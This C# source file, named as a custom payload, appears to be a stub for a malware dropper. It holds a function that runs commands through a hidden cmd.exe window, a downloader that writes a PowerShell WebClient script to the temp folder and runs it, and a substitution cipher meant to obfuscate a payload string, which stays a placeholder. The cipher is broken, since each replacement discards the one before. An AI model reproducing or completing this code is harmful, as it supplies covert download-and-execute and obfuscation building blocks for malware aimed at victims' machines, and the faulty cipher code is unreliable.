using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
using System.IO.Compression;
using System.Web;
using System.Threading;
using System.Text.RegularExpressions;

namespace DScustomPayload
{
    class Program
	{
		public static void sendmsg(string message, string color)
		{
			if (color == "red")
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine(message);
				Console.ResetColor();
			}
			else if (color == "green")
			{
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine(message);
				Console.ResetColor();
			}
			else if (color == "yellow")
			{
				Console.ForegroundColor = ConsoleColor.Yellow;
				Console.WriteLine(message);
				Console.ResetColor();
			}
			else if (color == "blue")
			{
				Console.ForegroundColor = ConsoleColor.Blue;
				Console.WriteLine(message);
				Console.ResetColor();
			}
		}
		public static void execute_cmd(string cmd)
        {
            
			
			string callcommand = "/c " + cmd ;
			
			ProcessStartInfo processInfo;
			Process process;
			
			string output = "";
			
			processInfo = new ProcessStartInfo("cmd.exe", callcommand);
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
			output = process.StandardOutput.ReadToEnd();
        }
		public static void Download(string url, string outPath)
		{
			string tempdir = Path.GetTempPath();
			// string tempdir = "./";
			
			execute_cmd("if exist " + tempdir + "\\download.ps1 (del " + tempdir + "\\download.ps1)");			
			
			
			url = '"' + url + '"';
			
			outPath = '"' + outPath + '"';
			
			string str = "(New-Object System.Net.WebClient).DownloadFile(" + url + ", " + outPath + ")";
			
			outPath = tempdir + "\\download.ps1";
			
            // open or create file
            FileStream streamfile = new FileStream(outPath, FileMode.OpenOrCreate, FileAccess.Write);
            // create stream writer
            StreamWriter streamwrite = new StreamWriter(streamfile);
            // add some lines
			
			outPath = '"' + tempdir + "\\download.ps1" + '"';
			
			
			// string powershelldownloadtxt = "" + url +"\  "
            streamwrite.WriteLine(str);
            // clear streamwrite data
            streamwrite.Flush();
            // close stream writer
            streamwrite.Close();
            // close stream file
            streamfile.Close();
			

			// string error = "";
			// int exitCode = 0;
			
			ProcessStartInfo processInfo;
			Process process;
			processInfo = new ProcessStartInfo("cmd.exe", "/c powershell " + tempdir + "\\download.ps1");
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();		
		}
		public static void write_txt_to_file(string name, string text)
		{
			File.WriteAllText(name, text);
		}
		public static string decrypt(string value)
		{
			// upper+lower chars
			string decrypted = value.Replace("/0,5/", "a");
			decrypted = value.Replace("/1/", "A");
			decrypted = value.Replace("/1,5/", "b");
			decrypted = value.Replace("/2/", "B");
			decrypted = value.Replace("/2,5/", "c");
			decrypted = value.Replace("/3/", "C");
			decrypted = value.Replace("/3,5/", "d");
			decrypted = value.Replace("/4/", "D");
			decrypted = value.Replace("/4,5/", "e");
			decrypted = value.Replace("/5/", "E");
			decrypted = value.Replace("/5,5/", "f");
			decrypted = value.Replace("/6/", "F");
			decrypted = value.Replace("/6,5/", "g");
			decrypted = value.Replace("/7/", "G");
			decrypted = value.Replace("/7,5/", "h");
			decrypted = value.Replace("/8/", "H");
			decrypted = value.Replace("/8,5/", "i");
			decrypted = value.Replace("/9/", "I");
			decrypted = value.Replace("/9,5/", "j");
			decrypted = value.Replace("/10/", "J");
			decrypted = value.Replace("/10,5/", "k");
			decrypted = value.Replace("/11/", "K");
			decrypted = value.Replace("/11,5/", "l");
			decrypted = value.Replace("/12/", "L");
			decrypted = value.Replace("/12,5/", "m");
			decrypted = value.Replace("/13/", "M");
			decrypted = value.Replace("/13,5/", "n");
			decrypted = value.Replace("/14/", "N");
			decrypted = value.Replace("/14,5/", "o");
			decrypted = value.Replace("/15/", "O");
			decrypted = value.Replace("/15,5/", "p");
			decrypted = value.Replace("/16/", "P");
			decrypted = value.Replace("/16,5/", "q");
			decrypted = value.Replace("/17/", "Q");
			decrypted = value.Replace("/17,5/", "r");
			decrypted = value.Replace("/18/", "R");
			decrypted = value.Replace("/18,5/", "s");
			decrypted = value.Replace("/19/", "S");
			decrypted = value.Replace("/19,5/", "t");
			decrypted = value.Replace("/20/", "T");
			decrypted = value.Replace("/20,5/", "u");
			decrypted = value.Replace("/21/", "U");
			decrypted = value.Replace("/21,5/", "v");
			decrypted = value.Replace("/22/", "V");
			decrypted = value.Replace("/22,5/", "w");
			decrypted = value.Replace("/23/", "W");
			decrypted = value.Replace("/23,5/", "x");
			decrypted = value.Replace("/24/", "X");
			decrypted = value.Replace("/24,5/", "y");
			decrypted = value.Replace("/25/", "Y");
			decrypted = value.Replace("/25,5/", "z");
			decrypted = value.Replace("/26/", "Z");
			
			// special chars
			decrypted = value.Replace("/26,5/", ".");
			decrypted = value.Replace("/27/", "$");
			decrypted = value.Replace("/27,5/", "£");
			decrypted = value.Replace("/28/", "€");
			decrypted = value.Replace("/28,5/", ":");
			decrypted = value.Replace("/29/", "/");
			decrypted = value.Replace("/29,5/", "%");
			decrypted = value.Replace("/30/", "\\");
			decrypted = value.Replace("/30,5/", "*");
			decrypted = value.Replace("/31/", "=");
			decrypted = value.Replace("/31,5/", "@");
			decrypted = value.Replace("/32/", "ç");
			decrypted = value.Replace("/32,5/", "é");
			decrypted = value.Replace("/33/", "&");
			decrypted = value.Replace("/33,5/", "~");
			decrypted = value.Replace("/34/", "'");
			decrypted = value.Replace("/34,5/", "`");
			decrypted = value.Replace("/35/", "|");
			decrypted = value.Replace("/35,5/", "[");
			decrypted = value.Replace("/36/", "]");
			decrypted = value.Replace("/36,5/", "!");
			decrypted = value.Replace("/37/", "?");
			decrypted = value.Replace("/37,5/", ";");
			decrypted = value.Replace("/38/", "(");
			decrypted = value.Replace("/38,5/", ")");
			
			// numbers
			decrypted = value.Replace("/39/", "1");
			decrypted = value.Replace("/39,5/", "2");
			decrypted = value.Replace("/40/", "3");
			decrypted = value.Replace("/40,5/", "4");
			decrypted = value.Replace("/41/", "5");
			decrypted = value.Replace("/41,5/", "6");
			decrypted = value.Replace("/42/", "7");
			decrypted = value.Replace("/42,5/", "8");
			decrypted = value.Replace("/43/", "9");
			decrypted = value.Replace("/43,5/", "0");
			decrypted = value.Replace("/44/", "-");
			decrypted = value.Replace("/44,5/", "+");
			decrypted = value.Replace("/45/", "\"");
			decrypted = value.Replace("/45,5/", "#");
			decrypted = value.Replace("/46/", "è");
			decrypted = value.Replace("/46,5/", "^");
			decrypted = value.Replace("/47/", "¨");
			decrypted = value.Replace("/47,5/", "à");
			
			return decrypted;
		}
		public static string encrypt(string value)
		{
			// upper+lower chars
			string encrypted = value.Replace("a", "/0,5/");
			encrypted = value.Replace("A", "/1/");
			encrypted = value.Replace("b", "/1,5/");
			encrypted = value.Replace("B", "/2/");
			encrypted = value.Replace("c", "/2,5/");
			encrypted = value.Replace("C", "/3/");
			encrypted = value.Replace("d", "/3,5/");
			encrypted = value.Replace("D", "/4/");
			encrypted = value.Replace("e", "/4,5/");
			encrypted = value.Replace("E", "/5/");
			encrypted = value.Replace("f", "/5,5/");
			encrypted = value.Replace("F", "/6/");
			encrypted = value.Replace("g", "/6,5/");
			encrypted = value.Replace("G", "/7/");
			encrypted = value.Replace("h", "/7,5/");
			encrypted = value.Replace("H", "/8/");
			encrypted = value.Replace("i", "/8,5/");
			encrypted = value.Replace("I", "/9/");
			encrypted = value.Replace("j", "/9,5/");
			encrypted = value.Replace("J", "/10/");
			encrypted = value.Replace("k", "/10,5/");
			encrypted = value.Replace("K", "/11/");
			encrypted = value.Replace("l", "/11,5/");
			encrypted = value.Replace("L", "/12/");
			encrypted = value.Replace("m", "/12,5/");
			encrypted = value.Replace("M", "/13/");
			encrypted = value.Replace("n", "/13,5/");
			encrypted = value.Replace("N", "/14/");
			encrypted = value.Replace("o", "/14,5/");
			encrypted = value.Replace("O", "/15/");
			encrypted = value.Replace("p", "/15,5/");
			encrypted = value.Replace("P", "/16/");
			encrypted = value.Replace("q", "/16,5/");
			encrypted = value.Replace("Q", "/17/");
			encrypted = value.Replace("r", "/17,5/");
			encrypted = value.Replace("R", "/18/");
			encrypted = value.Replace("s", "/18,5/");
			encrypted = value.Replace("S", "/19/");
			encrypted = value.Replace("t", "/19,5/");
			encrypted = value.Replace("T", "/20/");
			encrypted = value.Replace("u", "/20,5/");
			encrypted = value.Replace("U", "/21/");
			encrypted = value.Replace("v", "/21,5/");
			encrypted = value.Replace("V", "/22/");
			encrypted = value.Replace("w", "/22,5/");
			encrypted = value.Replace("W", "/23/");
			encrypted = value.Replace("x", "/23,5/");
			encrypted = value.Replace("X", "/24/");
			encrypted = value.Replace("y", "/24,5/");
			encrypted = value.Replace("Y", "/25/");
			encrypted = value.Replace("z", "/25,5/");
			encrypted = value.Replace("Z", "/26/");
			
			// special chars
			encrypted = value.Replace(".", "/26,5/");
			encrypted = value.Replace("$", "/27/");
			encrypted = value.Replace("£", "/27,5/");
			encrypted = value.Replace("€", "/28/");
			encrypted = value.Replace(":", "/28,5/");
			encrypted = value.Replace("/", "/29/");
			encrypted = value.Replace("%", "/29,5/");
			encrypted = value.Replace("\\", "/30/");
			encrypted = value.Replace("*", "/30,5/");
			encrypted = value.Replace("=", "/31/");
			encrypted = value.Replace("@", "/31,5/");
			encrypted = value.Replace("ç", "/32/");
			encrypted = value.Replace("é", "/32,5/");
			encrypted = value.Replace("&", "/33/");
			encrypted = value.Replace("~", "/33,5/");
			encrypted = value.Replace("'", "/34/");
			encrypted = value.Replace("`", "/34,5/");
			encrypted = value.Replace("|", "/35/");
			encrypted = value.Replace("[", "/35,5/");
			encrypted = value.Replace("]", "/36/");
			encrypted = value.Replace("!", "/36,5/");
			encrypted = value.Replace("?", "/37/");
			encrypted = value.Replace(";", "/37,5/");
			encrypted = value.Replace("(", "/38/");
			encrypted = value.Replace(")", "/38,5/");
			
			// numbers
			encrypted = value.Replace("1", "/39/");
			encrypted = value.Replace("2", "/39,5/");
			encrypted = value.Replace("3", "/40/");
			encrypted = value.Replace("4", "/40,5/");
			encrypted = value.Replace("5", "/41/");
			encrypted = value.Replace("6", "/41,5/");
			encrypted = value.Replace("7", "/42/");
			encrypted = value.Replace("8", "/42,5/");
			encrypted = value.Replace("9", "/43/");
			encrypted = value.Replace("0", "/43,5/");
			encrypted = value.Replace("-", "/44/");
			encrypted = value.Replace("+", "/44,5/");
			encrypted = value.Replace("\"", "/45/");
			encrypted = value.Replace("#", "/45,5/");
			encrypted = value.Replace("è", "/46/");
			encrypted = value.Replace("^", "/46,5/");
			encrypted = value.Replace("¨", "/47/");
			encrypted = value.Replace("à", "/47,5/");
			
			return encrypted;
		}
		static void Main(string[] args)
        {
			string encDANGpayload = @"%your_dang_payload%";
			
			Console.WriteLine("dec: "+decrypt(encDANGpayload));
			Console.Read();
		}
	}
}